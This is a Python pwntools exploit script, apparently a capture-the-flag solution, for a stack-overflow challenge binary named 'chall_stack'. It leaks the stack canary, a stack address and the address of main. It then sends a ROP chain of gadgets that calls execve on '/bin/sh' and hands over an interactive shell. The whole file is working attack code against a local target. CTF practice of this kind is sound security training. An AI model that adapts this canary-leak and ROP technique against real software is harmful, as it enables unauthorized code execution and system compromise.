import sys
from pwn import *

bin_file = './chall_stack'
context(os = 'linux', arch = 'amd64')

binf = ELF(bin_file)


def attack(conn, **kwargs):
    buf1 = b'a'*0x18 + b'!'
    conn.sendafter(b'>> ', buf1)
    conn.recvuntil(b'a!')
    canary = unpack(b'\x00' + conn.recv(7))
    info('canary = 0x{:08x}'.format(canary))

    buf2 = b'b'*0x3f + b'!'
    conn.sendafter(b'>> ', buf2)
    conn.recvuntil(b'b!')
    addr_stack = unpack(conn.recv(6), 'all')-0x158
    info('addr_stack = 0x{:08x}'.format(addr_stack))

    buf3 = b'c'*0x47 + b'!'
    conn.sendafter(b'>> ', buf3)
    conn.recvuntil(b'c!')
    addr_main = unpack(conn.recv(6), 'all')
    info('addr_main = 0x{:08x}'.format(addr_main))

    symbol_main = 0x000000000000a0c9
    base_addr = addr_main - symbol_main
    xor_rax = 0x000000000004e869
    pop_rax = 0x0000000000059a27
    pop_rdi = 0x0000000000009c3a
    pop_rsi = 0x00000000000177ce
    pop_rdx = 0x0000000000009b3f
    syscall = 0x00000000000262a4
    buf4  = b'/bin/sh'.ljust(0x18, b'\x00')
    buf4 += pack(canary)
    buf4 += pack(0xdeadbeef)
    #rop chains
    buf4 += flat(base_addr+pop_rdi, addr_stack)
    buf4 += flat(base_addr+pop_rsi, 0)
    buf4 += flat(base_addr+pop_rdx, 0)
    buf4 += flat(base_addr+pop_rax, 59)
    buf4 += pack(base_addr+syscall)
    conn.sendafter(b'>> ', buf4)


def main():
    conn = process(bin_file)
#     conn = gdb.debug(bin_file, '''
#     break main
# ''')
    attack(conn)
    conn.interactive()


if __name__ == '__main__':
    main()


